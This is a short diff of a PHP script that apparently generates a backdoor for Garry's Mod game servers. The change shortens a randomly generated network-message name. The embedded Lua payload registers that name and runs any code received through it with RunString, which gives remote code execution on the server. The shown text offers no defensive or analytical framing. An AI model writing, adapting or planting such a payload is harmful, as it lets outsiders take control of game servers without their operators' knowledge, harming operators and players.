@@ -34,7 +34,7 @@ if(empty($password)) {
 }
 
 // pass to script if the informations called
-$net = substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(24/strlen($x)))), 1, 24);
+$net = substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(12/strlen($x)))), 1, 12);
 $lua = "util.AddNetworkString('$net'); net.Receive('$net', function(len) RunString(net.ReadString()) end)";
 
 // if the server is from garry's mod game server client then continue
